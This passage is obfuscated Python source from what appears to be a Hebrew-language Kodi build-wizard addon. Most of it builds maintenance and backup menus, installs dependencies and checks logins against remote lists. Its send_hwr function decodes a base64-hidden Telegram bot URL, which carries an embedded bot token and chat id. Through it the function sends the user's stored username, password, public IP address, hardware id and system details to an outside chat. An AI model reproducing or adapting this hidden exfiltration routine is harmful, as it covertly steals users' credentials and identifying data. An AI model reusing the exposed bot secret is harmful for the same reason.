	DP .update (0 ,OOOOO00OO00O0O000 ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:3133
	O0OO00O00O0O00OOO ,OO00OO000OO0O0O0O ,O000OOO0O0OOOO0OO =extract .all (OOO00000OOOOOO0OO ,ADDONS ,DP ,title =OOOOO00OO00O0O000 )#line:3134
	DP .update (0 ,OOOOO00OO00O0O000 ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:3135
	installed (O0OOOO0O00OOO0000 )#line:3136
	installDep (O0OOOO0O00OOO0000 ,DP )#line:3137
	DP .close ()#line:3138
	wiz .ebi ('UpdateAddonRepos()')#line:3139
	wiz .ebi ('UpdateLocalAddons()')#line:3140
	wiz .refresh ()#line:3141
def installDep (O0000OO00OOO0OO0O ,DP =None ):#line:3143
	O0OOOOOOO0O0OO000 =os .path .join (ADDONS ,O0000OO00OOO0OO0O ,'addon.xml')#line:3144
	if os .path .exists (O0OOOOOOO0O0OO000 ):#line:3145
		OOO0O0000O0O00O0O =open (O0OOOOOOO0O0OO000 ,mode ='r');OOO0O00OO00OO0OOO =OOO0O0000O0O00O0O .read ();OOO0O0000O0O00O0O .close ();#line:3146
		OOO000OO000O000O0 =wiz .parseDOM (OOO0O00OO00OO0OOO ,'import',ret ='addon')#line:3147
		for OOOOOOOO00O00OOOO in OOO000OO000O000O0 :#line:3148
			if not 'xbmc.python'in OOOOOOOO00O00OOOO :#line:3149
				if not DP ==None :#line:3150
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOOOOO00O00OOOO ))#line:3151
				wiz .createTemp (OOOOOOOO00O00OOOO )#line:3152
def installed (O0OOO00O0OOO00O0O ):#line:3179
	OO000OO00000OO0O0 =os .path .join (ADDONS ,O0OOO00O0OOO00O0O ,'addon.xml')#line:3180
	if os .path .exists (OO000OO00000OO0O0 ):#line:3181
		try :#line:3182
			OOO00OO00O00OOOO0 =open (OO000OO00000OO0O0 ,mode ='r');O00O000O0OO00O00O =OOO00OO00O00OOOO0 .read ();OOO00OO00O00OOOO0 .close ()#line:3183
			OO0OO0OO0OOO0O0OO =wiz .parseDOM (O00O000O0OO00O00O ,'addon',ret ='name',attrs ={'id':O0OOO00O0OOO00O0O })#line:3184
			OO0000O0O000OO00O =os .path .join (ADDONS ,O0OOO00O0OOO00O0O ,'icon.png')#line:3185
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0OO0OO0OOO0O0OO [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO0000O0O000OO00O )#line:3186
		except :pass #line:3187
def youtubeMenu (url =None ):#line:3189
	if not YOUTUBEFILE =='http://':#line:3190
		if url ==None :#line:3191
			OOO0O0O00000OO00O =wiz .workingURL (YOUTUBEFILE )#line:3192
			OOOO0OOO0O0O0O00O =uservar .YOUTUBEFILE #line:3193
		else :#line:3194
			OOO0O0O00000OO00O =wiz .workingURL (url )#line:3195
			OOOO0OOO0O0O0O00O =url #line:3196
		if OOO0O0O00000OO00O ==True :#line:3197
			OO0OO00O00OO0O00O =wiz .openURL (OOOO0OOO0O0O0O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:3198
			OO000O000OOOOO0O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO0OO00O00OO0O00O )#line:3199
			if len (OO000O000OOOOO0O0 )>0 :#line:3200
				for OOO0OO0000000OO00 ,O0OO0O0O00OO0OO0O ,url ,OOO00OOO00000OO0O ,OOO0O0OO0OOO0OO00 ,O0OO0O00OOOO0O000 in OO000O000OOOOO0O0 :#line:3201
					if O0OO0O0O00OO0OO0O .lower ()=="yes":#line:3202
						addDir ("[B]%s[/B]"%OOO0OO0000000OO00 ,'youtube',url ,description =O0OO0O00OOOO0O000 ,icon =OOO00OOO00000OO0O ,fanart =OOO0O0OO0OOO0OO00 ,themeit =THEME3 )#line:3203
					else :#line:3204
						addFile (OOO0OO0000000OO00 ,'viewVideo',url =url ,description =O0OO0O00OOOO0O000 ,icon =OOO00OOO00000OO0O ,fanart =OOO0O0OO0OOO0OO00 ,themeit =THEME2 )#line:3205
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:3206
		else :#line:3207
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:3208
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:3209
			addFile ('%s'%OOO0O0O00000OO00O ,'',themeit =THEME3 )#line:3210
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:3211
	setView ('files','viewType')#line:3212
def STARTP ():#line:3213
	OOO0O00O00O000OO0 =(ADDON .getSetting ("pass"))#line:3214
	if BUILDNAME =="":#line:3215
	 if not NOTIFY =='true':#line:3216
          O0OOO0OOOO00000OO =wiz .workingURL (NOTIFICATION )#line:3217
	 if not NOTIFY2 =='true':#line:3218
          O0OOO0OOOO00000OO =wiz .workingURL (NOTIFICATION2 )#line:3219
	 if not NOTIFY3 =='true':#line:3220
          O0OOO0OOOO00000OO =wiz .workingURL (NOTIFICATION3 )#line:3221
	OO0OOO00O0O00OO00 =OOO0O00O00O000OO0 #line:3222
	O0OOO0OOOO00000OO =urllib2 .Request (SPEED )#line:3223
	OO0O0OO0000O0OOOO =urllib2 .urlopen (O0OOO0OOOO00000OO )#line:3224
	O0OO0000000O00OOO =OO0O0OO0000O0OOOO .readlines ()#line:3226
	OOO0O00000OO00O00 =0 #line:3230
	for O00O00O0000OOOO0O in O0OO0000000O00OOO :#line:3231
		if O00O00O0000OOOO0O .split (' ==')[0 ]==OOO0O00O00O000OO0 or O00O00O0000OOOO0O .split ()[0 ]==OOO0O00O00O000OO0 :#line:3232
			OOO0O00000OO00O00 =1 #line:3233
			break #line:3234
	if OOO0O00000OO00O00 ==0 :#line:3235
					O0O0000OOOOOO0OOO =DIALOG .yesno ("%s"%'בעיה בסיסמה',"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR yellow]הכנס סיסמה[/COLOR][/B]')#line:3236
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow','יש לפנות לכתובת הזאת בטלגרם'),'[COLOR %s]https://t.me/kodi17[/COLOR]'%COLOR2 )#line:3237
					if BUILDNAME =="":#line:3238
						xbmc .executebuiltin ("ActivateWindow(home)")#line:3239
					if O0O0000OOOOOO0OOO :#line:3241
						ADDON .openSettings ()#line:3243
						sys .exit ()#line:3246
					else :#line:3247
						sys .exit ()#line:3248
	return 'ok'#line:3253
def STARTP2 ():#line:3254
	OOO0OOO00000OO0O0 =(ADDON .getSetting ("user"))#line:3255
	OOOOO0000O0O0OOO0 =(UNAME )#line:3257
	O0OOOO00OO0OO0OO0 =urllib2 .urlopen (OOOOO0000O0O0OOO0 )#line:3258
	O00OOOO00OO0O0O0O =O0OOOO00OO0OO0OO0 .readlines ()#line:3259
	OO0OOO000OOOO00O0 =0 #line:3260
	for OOO0O0OOOO000OO00 in O00OOOO00OO0O0O0O :#line:3263
		if OOO0O0OOOO000OO00 .split (' ==')[0 ]==OOO0OOO00000OO0O0 or OOO0O0OOOO000OO00 .split ()[0 ]==OOO0OOO00000OO0O0 :#line:3264
			OO0OOO000OOOO00O0 =1 #line:3265
			break #line:3266
	if OO0OOO000OOOO00O0 ==0 :#line:3267
		OO0OOO0O00O0O0OOO =DIALOG .yesno ("%s"%'בעיה בשם המשתמש',"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR yellow]הכנס שם משתמש[/COLOR][/B]')#line:3268
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow','יש לפנות לכתובת הזאת בטלגרם'),'[COLOR %s]https://t.me/kodi17[/COLOR]'%COLOR2 )#line:3269
		if BUILDNAME =="":#line:3270
			xbmc .executebuiltin ("ActivateWindow(home)")#line:3271
		if OO0OOO0O00O0O0OOO :#line:3273
			ADDON .openSettings ()#line:3275
			sys .exit ()#line:3279
		else :#line:3280
			sys .exit ()#line:3281
	return 'ok'#line:3286
def passandpin ():#line:3287
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:3288
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:3289
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:3290
def passandUsername ():#line:3291
	ADDON .openSettings ()#line:3293
def folderback ():#line:3296
    OO0OOOOO00000O0OO =ADDON .getSetting ("path")#line:3297
    if OO0OOOOO00000O0OO :#line:3298
      OO0OOOOO00000O0OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:3299
      ADDON .setSetting ("path",OO0OOOOO00000O0OO )#line:3300
def user_sync ():#line:3301
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]מסנכרן את החשבון שלך[/COLOR]'%COLOR2 )#line:3302
    O0O000OO0O000OOO0 =(ADDON .getSetting ("sync_user"))#line:3303
    O000O0O0OOO0O0O0O =xbmcaddon .Addon ('plugin.program.mediasync')#line:3304
    O00OO0OOOOOO00000 =xbmcaddon .Addon ('plugin.video.telemedia')#line:3305
    OO00O00OO0OO0OO00 =xbmcaddon .Addon ('plugin.video.mando')#line:3306
    O0O00OO0OOO0OO00O =xbmcaddon .Addon ('plugin.video.wallmovie')#line:3307
    OOOOO000OO0000OO0 =xbmcaddon .Addon ('plugin.video.torrent')#line:3308
    O0OO000OOO00OO0O0 =xbmcaddon .Addon ('context.myfav')#line:3309
    O0OO000OOO00OO0O0 .setSetting ('firebase',O0O000OO0O000OOO0 )#line:3310
    O000O0O0OOO0O0O0O .setSetting ('firebase',O0O000OO0O000OOO0 )#line:3311
    O000O0O0OOO0O0O0O .setSetting ('sync_mod','true')#line:3312
    O00OO0OOOOOO00000 .setSetting ('firebase',O0O000OO0O000OOO0 )#line:3313
    OO00O00OO0OO0OO00 .setSetting ('firebase',O0O000OO0O000OOO0 )#line:3314
    O0O00OO0OOO0OO00O .setSetting ('firebase',O0O000OO0O000OOO0 )#line:3315
    OOOOO000OO0000OO0 .setSetting ('firebase',O0O000OO0O000OOO0 )#line:3316
    O00OO0OOOOOO00000 .setSetting ('sync_mod','true')#line:3317
    OO00O00OO0OO0OO00 .setSetting ('sync_mod','true')#line:3318
    O0O00OO0OOO0OO00O .setSetting ('sync_mod','true')#line:3319
    OOOOO000OO0000OO0 .setSetting ('sync_mod','true')#line:3320
    O0OO000OOO00OO0O0 .setSetting ('sync_mod','true')#line:3321
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.telemedia?mode=184&url=www)")#line:3322
    if ADDON .getSetting ("sync_skin")=='true':#line:3323
     xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.mediasync/?mode=13&url=www)")#line:3324
    xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.mediasync/?mode=10&url=www)")#line:3326
def send_hwr ():#line:3327
       try :#line:3329
          import json #line:3331
          wiz .log ('FRESH MESSAGE')#line:3332
          O0OO00OO000000OO0 =(ADDON .getSetting ("user"))#line:3333
          O00O00O0OOOOO00OO =(ADDON .getSetting ("pass"))#line:3334
          OOOOOOOOO0OOOOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3335
          O0OOOO0OOO0OO00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEzMDQxMzU5MTM6QUFITHdGMWRxbktSTGQ4WUdkUjdyRldpTFdOYmFVcnE4ekUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM2NDU5OTc4NCZ0ZXh0Pdep15zXlyDXp9eV15Mg157Xm9ep15nXqCAtIA=='#line:3336
          O000OO00OO00OO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3337
          OOOOOO00OO0OOOO00 =str (json .loads (O000OO00OO00OO0O0 )['ip'])#line:3338
          O0O00OOO0O0OOO0OO =O0OO00OO000000OO0 #line:3339
          OOO0OOO00000OO000 =O00O00O0OOOOO00OO #line:3340
          import socket #line:3341
          O000OO00OO00OO0O0 =urllib2 .urlopen (O0OOOO0OOO0OO00O0 .decode ('base64')+ADDON .getLocalizedString (32011 )+(HARDWAER )+ADDON .getLocalizedString (32012 )+O0O00OOO0O0OOO0OO +ADDON .getLocalizedString (32013 )+OOO0OOO00000OO000 +ADDON .getLocalizedString (32014 )+OOOOOOOOO0OOOOOOO +ADDON .getLocalizedString (32015 )+OOOOOO00OO0OOOO00 +ADDON .getLocalizedString (32016 )+platform .system ()).readlines ()#line:3342
          wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]נשלח[/COLOR]'%COLOR2 )#line:3344
       except :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אין קוד פנה למנהל[/COLOR]'%COLOR2 )#line:3345
def backmyupbuild ():#line:3346
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3350
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3351
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3352
		addFile ('גיבוי הגדרות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3355
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3356
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3358
def maintMenu (view =None ):#line:3362
	OOOO00OOO0O000OOO ='[B][COLOR green]ON[/COLOR][/B]';O0O0OO0O000000OOO ='[B][COLOR red]OFF[/COLOR][/B]'#line:3364
	O00OOO0O00OOOO000 ='true'if AUTOCLEANUP =='true'else 'false'#line:3365
	O0O0000O00O0OOO0O ='true'if AUTOCACHE =='true'else 'false'#line:3366
	O00O00O0000OO0O00 ='true'if AUTOPACKAGES =='true'else 'false'#line:3367
	OOO0O0OO00OO0OOOO ='true'if AUTOTHUMBS =='true'else 'false'#line:3368
	OOO000O000000O0O0 ='true'if SHOWMAINT =='true'else 'false'#line:3369
	OO00O0OOOO0OOO0O0 ='true'if INCLUDEVIDEO =='true'else 'false'#line:3370
	OOOO00OO0OO000O00 ='true'if INCLUDEALL =='true'else 'false'#line:3371
	O0OOOOOO00OO0OOO0 ='true'if THIRDPARTY =='true'else 'false'#line:3372
	if wiz .Grab_Log (True )==False :OOOOOO0000O0OOOO0 =0 #line:3373
	else :OOOOOO0000O0OOOO0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:3374
	if wiz .Grab_Log (True ,True )==False :O0OO00OO00OO0O0OO =0 #line:3375
	else :O0OO00OO00OO0O0OO =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:3376
	OOOO0O000O00000O0 =int (OOOOOO0000O0OOOO0 )+int (O0OO00OO00OO0O0OO )#line:3377
	OO00OOO000OO0OO00 =str (OOOO0O000O00000O0 )+' Error(s) Found'if OOOO0O000O00000O0 >0 else 'None Found'#line:3378
	O0O00OO00O0OO00OO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:3379
	if OOOO00OO0OO000O00 =='true':#line:3380
		O000000OOOOO00000 ='true'#line:3381
		O00O00O000OOO0000 ='true'#line:3382
		O00O00OOOOO0O0OO0 ='true'#line:3383
		OO00OO0OOOO0OOOO0 ='true'#line:3384
		OOO0OO00OOO0O0O00 ='true'#line:3385
		O0O00OOOOOO000O00 ='true'#line:3386
		O00OOO0O0O0OOOO0O ='true'#line:3387
		O0OOOOO00000O0O00 ='true'#line:3388
	else :#line:3389
		O000000OOOOO00000 ='true'if INCLUDEBOB =='true'else 'false'#line:3390
		O00O00O000OOO0000 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:3391
		O00O00OOOOO0O0OO0 ='true'if INCLUDESPECTO =='true'else 'false'#line:3392
		OO00OO0OOOO0OOOO0 ='true'if INCLUDEGENESIS =='true'else 'false'#line:3393
		OOO0OO00OOO0O0O00 ='true'if INCLUDEEXODUS =='true'else 'false'#line:3394
		O0O00OOOOOO000O00 ='true'if INCLUDEONECHAN =='true'else 'false'#line:3395
		O00OOO0O0O0OOOO0O ='true'if INCLUDESALTS =='true'else 'false'#line:3396
		O0OOOOO00000O0O00 ='true'if INCLUDESALTSHD =='true'else 'false'#line:3397
	O00O0000O0O000O00 =wiz .getSize (PACKAGES )#line:3398
	OOO00O00O00O000OO =wiz .getSize (THUMBS )#line:3399
	O000O00O00OO0O0OO =wiz .getCacheSize ()#line:3400
	O00OOO0OO0O0O0OOO =O00O0000O0O000O00 +OOO00O00O00O000OO +O000O00O00OO0O0OO #line:3401
	OO00OOO0O0OOO000O =['Daily','Always','3 Days','Weekly']#line:3402
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:3403
	if view =="clean"or SHOWMAINT =='true':#line:3404
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00OOO0OO0O0O0OOO ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:3405
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O00O00OO0O0OO ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3406
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O0000O0O000O00 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3407
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO00O00O00O000OO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:3408
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3409
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:3410
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:3411
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:3412
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:3413
	if view =="addon"or SHOWMAINT =='false':#line:3414
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3415
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:3416
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:3417
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:3418
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3419
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3420
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:3421
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:3422
	if view =="misc"or SHOWMAINT =='true':#line:3423
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:3424
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:3425
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:3426
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:3427
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:3428
		addFile ('View Errors in Log: %s'%(OO00OOO000OO0OO00 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:3429
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:3430
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3431
		addFile ('Clear Wizard Log File%s'%O0O00OO00O0OO00OO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:3432
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:3433
	if view =="backup"or SHOWMAINT =='true':#line:3434
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:3435
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:3436
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:3437
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:3438
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:3439
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3440
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:3441
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:3442
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3443
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:3444
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:3445
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:3446
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:3447
	if view =="tweaks"or SHOWMAINT =='true':#line:3448
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:3449
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:3450
		else :#line:3451
			if os .path .exists (ADVANCED ):#line:3452
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:3453
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3454
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:3455
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:3456
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:3457
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:3458
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:3459
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:3460
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:3461
	addFile ('Show All Maintenance: %s'%OOO000O000000O0O0 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:3462
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:3463
	addFile ('Third Party Wizards: %s'%O0OOOOOO00OO0OOO0 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3464
	if O0OOOOOO00OO0OOO0 =='true':#line:3465
		O0OOOOOOO00O0OOO0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:3466
		O0O0OO000O00OO0O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:3467
		OOOOO0OO000O0OO0O =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:3468
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0OOOOOOO00O0OOO0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:3469
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O0OO000O00OO0O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:3470
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO0OO000O0OO0O ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:3471
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3472
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00OOO0O00OOOO000 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:3473
	if O00OOO0O00OOOO000 =='true':#line:3474
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OO00OOO0O0OOO000O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:3475
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0O0000O00O0OOO0O .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:3476
		addFile ('--- ניקוי חבילות בהפעלה: %s'%O00O00O0000OO0O00 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:3477
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%OOO0O0OO00OO0OOOO .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:3478
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:3479
	addFile ('Include Video Cache in Clear Cache: %s'%OO00O0OOOO0OOO0O0 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:3480
	if OO00O0OOOO0OOO0O0 =='true':#line:3481
		addFile ('--- Include All Video Addons: %s'%OOOO00OO0OO000O00 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:3482
		addFile ('--- Include Bob: %s'%O000000OOOOO00000 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:3483
		addFile ('--- Include Phoenix: %s'%O00O00O000OOO0000 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:3484
		addFile ('--- Include Specto: %s'%O00O00OOOOO0O0OO0 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:3485
		addFile ('--- Include Exodus: %s'%OOO0OO00OOO0O0O00 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:3486
		addFile ('--- Include Salts: %s'%O00OOO0O0O0OOOO0O .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:3487
		addFile ('--- Include Salts HD Lite: %s'%O0OOOOO00000O0O00 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:3488
		addFile ('--- Include One Channel: %s'%O0O00OOOOOO000O00 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:3489
		addFile ('--- Include Genesis: %s'%OO00OO0OOOO0OOOO0 .replace ('true',OOOO00OOO0O000OOO ).replace ('false',O0O0OO0O000000OOO ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:3490
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:3491
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:3492
	setView ('files','viewType')#line:3493
def advancedWindow (url =None ):#line:3495
	if not ADVANCEDFILE =='http://':#line:3496
		if url ==None :#line:3497
			OO00OOO00OOOO0OOO =wiz .workingURL (ADVANCEDFILE )#line:3498
			OOOO00000OO000OO0 =uservar .ADVANCEDFILE #line:3499
